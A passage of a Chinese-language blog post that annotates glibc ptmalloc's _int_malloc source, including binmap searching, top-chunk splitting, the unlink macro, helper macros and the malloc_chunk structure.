|</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<h3 id="寻找binmap中是否有足够大的chunk"><a href="#寻找binmap中是否有足够大的chunk" class="headerlink" title="寻找binmap中是否有足够大的chunk"></a>寻找binmap中是否有足够大的chunk</h3><ul>
<li>根据<code>binmap</code>找到的<code>small bin 和 large bin</code>含有<code>free chunk的bin</code>，去找足够大小的<code>chunk</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSHIFT      5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BINMAPSIZE    (NBINS / BITSPERMAP)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];		</span><br><span class="line"><span class="comment">//ptmalloc 用一个 bit 来标识某一个 bin 中是否包含空闲 chunk</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">     bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">     (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">     that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">     The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">     when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  ++idx;</span><br><span class="line">  bin = bin_at (av, idx);</span><br><span class="line">  block = idx2block (idx);</span><br><span class="line">  <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">  bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">      <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                <span class="keyword">goto</span> use_top;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">          bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">          bit = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">      <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          bin = next_bin (bin);</span><br><span class="line">          bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">          assert (bit != <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">      victim = last (bin);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">      <span class="keyword">if</span> (victim == bin)</span><br><span class="line">        &#123;</span><br><span class="line">          av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">          bin = next_bin (bin);</span><br><span class="line">          bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">          assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* unlink */</span></span><br><span class="line">          unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Exhaust */</span></span><br><span class="line">          <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  set_non_main_arena (victim);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Split */</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                 have to perform a complete insert here.  */</span></span><br><span class="line">              bck = unsorted_chunks (av);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">  malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 2"</span>);</span><br><span class="line">              remainder-&gt;bk = bck;</span><br><span class="line">              remainder-&gt;fd = fwd;</span><br><span class="line">              bck-&gt;fd = remainder;</span><br><span class="line">              fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">              <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                av-&gt;last_remainder = remainder;</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line">            &#125;</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="查看top-chunk"><a href="#查看top-chunk" class="headerlink" title="查看top chunk"></a>查看top chunk</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="调用sysmalloc"><a href="#调用sysmalloc" class="headerlink" title="调用sysmalloc"></a>调用sysmalloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h1 id="涉及函数列表"><a href="#涉及函数列表" class="headerlink" title="涉及函数列表"></a>涉及函数列表</h1><h2 id="alloc-perturb"><a href="#alloc-perturb" class="headerlink" title="alloc_perturb"></a>alloc_perturb</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">alloc_perturb (<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*void *memset(void *s, int ch, size_t n);</span></span><br><span class="line"><span class="comment">将s中当前位置后面的n个字节 （typedef unsigned int size_t ）用 ch 替换并返回 s</span></span><br></pre></td></tr></table></figure>

<h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">assert</span><span class="params">( <span class="keyword">int</span> expression )</span></span>;</span><br><span class="line"><span class="comment">/*assert的作用是现计算表达式 expression ，如果其值为假（即为0），那么它先向stderr打印一条出错信息，然后通过调用 abort 来终止程序运行</span></span><br></pre></td></tr></table></figure>

<h2 id="bin-at"><a href="#bin-at" class="headerlink" title="bin_at"></a>bin_at</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line">  (mbinptr) (((<span class="keyword">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>]))			      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure>

<h2 id="catomic-compare-and-exchange-val-acq"><a href="#catomic-compare-and-exchange-val-acq" class="headerlink" title="catomic_compare_and_exchange_val_acq()"></a>catomic_compare_and_exchange_val_acq()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">catomic_compare_and_exchange_val_acq</span><br><span class="line">如果*MEM等于OLDVAL，则将*MEM存储为NEWVAL，返回OLDVAL；</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Atomically store NEWVAL in *MEM if *MEM is equal to OLDVAL.</span></span><br><span class="line"><span class="comment">Return the old *MEM value. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> catomic_compare_and_exchange_val_acq</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> __arch_c_compare_and_exchange_val_32_acq</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> catomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line">__atomic_val_bysize (__arch_c_compare_and_exchange_val,acq,    \</span><br><span class="line">     mem, newval, oldval)</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> catomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line">atomic_compare_and_exchange_val_acq (mem, newval, oldval)</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"> 相关博客链接</span><br><span class="line">https:<span class="comment">//blog.csdn.net/luozhaotian/article/details/80267895</span></span><br></pre></td></tr></table></figure>

<h2 id="check-malloced-chunk"><a href="#check-malloced-chunk" class="headerlink" title="check_malloced_chunk"></a>check_malloced_chunk</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_malloced_chunk(A, P, N)   do_check_malloced_chunk (A, P, N)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">do_check_malloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* same as recycled case ... */</span></span><br><span class="line">  do_check_remalloced_chunk (av, p, s);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     ... plus,  must obey implementation invariant that prev_inuse is</span></span><br><span class="line"><span class="comment">     always true of any allocated chunk; i.e., that each allocated</span></span><br><span class="line"><span class="comment">     chunk borders either a previously allocated and still in-use</span></span><br><span class="line"><span class="comment">     chunk, or the base of its memory arena. This is ensured</span></span><br><span class="line"><span class="comment">     by making all allocations from the `lowest' part of any found</span></span><br><span class="line"><span class="comment">     chunk.  This does not necessarily hold however for chunks</span></span><br><span class="line"><span class="comment">     recycled via fastbins.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  assert (prev_inuse (p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="check-remalloced-chunk"><a href="#check-remalloced-chunk" class="headerlink" title="check_remalloced_chunk ()"></a>check_remalloced_chunk ()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> check_remalloced_chunk(A, P, N) do_check_remalloced_chunk (A, P, N)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">do_check_remalloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = chunksize_nomask (p) &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));</span><br><span class="line">      <span class="keyword">if</span> (chunk_main_arena (p))</span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av != &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &gt;= MINSIZE);</span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));</span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*chunk_is_mmapped检查是否是mmap位是否为1,当mmap为1的时候可以跳过此检查</span></span><br><span class="line"><span class="comment">	do_check_inuse_chunk检查previnuse是否为1</span></span><br></pre></td></tr></table></figure>

<h2 id="chunk2mem"><a href="#chunk2mem" class="headerlink" title="chunk2mem"></a>chunk2mem</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="comment">//从malloc头到用户指针的转换</span></span><br></pre></td></tr></table></figure>

<h2 id="chunksize"><a href="#chunksize" class="headerlink" title="chunksize"></a>chunksize</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//标志位清0</span></span><br></pre></td></tr></table></figure>

<h2 id="last"><a href="#last" class="headerlink" title="last()"></a>last()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)   ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure>

<h2 id="largebin-index"><a href="#largebin-index" class="headerlink" title="largebin_index"></a>largebin_index</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz) \</span></span><br><span class="line">  (SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz)                                     \</span><br><span class="line">   : MALLOC_ALIGNMENT == <span class="number">16</span> ? largebin_index_32_big (sz)                     \</span><br><span class="line">   : largebin_index_32 (sz))</span><br></pre></td></tr></table></figure>

<h2 id="fastbin-index-sz"><a href="#fastbin-index-sz" class="headerlink" title="fastbin_index(sz)"></a>fastbin_index(sz)</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"></span><br><span class="line"> ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"><span class="comment">//计算bin下标</span></span><br></pre></td></tr></table></figure>

<h2 id="fastbin-ar-ptr-idx"><a href="#fastbin-ar-ptr-idx" class="headerlink" title="fastbin(ar_ptr, idx)"></a>fastbin(ar_ptr, idx)</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"><span class="comment">/* Fastbins */</span></span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br></pre></td></tr></table></figure>

<h2 id="first"><a href="#first" class="headerlink" title="first()"></a>first()</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)   ((b)-&gt;fd)</span></span><br></pre></td></tr></table></figure>

<h2 id="set-inuse-bit-at-offset"><a href="#set-inuse-bit-at-offset" class="headerlink" title="set_inuse_bit_at_offset"></a>set_inuse_bit_at_offset</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="line"><span class="comment">//将物理相邻的下一个chunk的PREV_INUSE置为一</span></span><br></pre></td></tr></table></figure>

<h2 id="set-non-main-arena"><a href="#set-non-main-arena" class="headerlink" title="set_non_main_arena("></a>set_non_main_arena(</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span><br></pre></td></tr></table></figure>

<h2 id="smallbin-index"><a href="#smallbin-index" class="headerlink" title="smallbin_index"></a>smallbin_index</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line">  ((SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="keyword">unsigned</span>) (sz)) &gt;&gt; <span class="number">3</span>))\</span><br><span class="line">   + SMALLBIN_CORRECTION)</span><br></pre></td></tr></table></figure>

<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);			      \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted double-linked list"</span>);			      \</span><br><span class="line">    <span class="keyword">else</span> &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))			      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">	      malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="glibc-likely"><a href="#glibc-likely" class="headerlink" title="__glibc_likely"></a>__glibc_likely</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC__ &gt;= 3</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __glibc_unlikely(cond) __builtin_expect ((cond), 0)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __glibc_likely(cond) __builtin_expect ((cond), 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __glibc_unlikely(cond) (cond)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __glibc_likely(cond) (cond)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	（先将返回值看成	cond的值就行） </span><br><span class="line">程序员可以使用likely/unlikely宏来预测cond的结果，然后通知编译器在编译时优化这个分支的汇编代码</span><br><span class="line">原型: <span class="keyword">long</span> __builtin_expect (<span class="keyword">long</span> EXP, <span class="keyword">long</span> C)，函数返回值就是EXP表达式的值，C是一个常量(<span class="number">0</span>或<span class="number">1</span>)，函数在语义上期待EXP==C</span><br><span class="line">     </span><br><span class="line">     相关博客链接</span><br><span class="line">     https:<span class="comment">//turingsec.github.io/builtin_expect/</span></span><br></pre></td></tr></table></figure>

<h1 id="涉及变量"><a href="#涉及变量" class="headerlink" title="涉及变量"></a>涉及变量</h1><h2 id="SINGLE-THREAD-P"><a href="#SINGLE-THREAD-P" class="headerlink" title="SINGLE_THREAD_P"></a>SINGLE_THREAD_P</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* For SINGLE_THREAD_P.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sysdep-cancel.h&gt;</span></span></span><br><span class="line"><span class="comment">//从&lt;sysdep-cancel.h&gt;得到</span></span><br><span class="line">大概看了不是很懂，大概意思单线程为 <span class="number">1</span> 多线程为 <span class="number">0</span>  (自己猜的：不保证正确性)</span><br></pre></td></tr></table></figure>

<h1 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h1><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><ul>
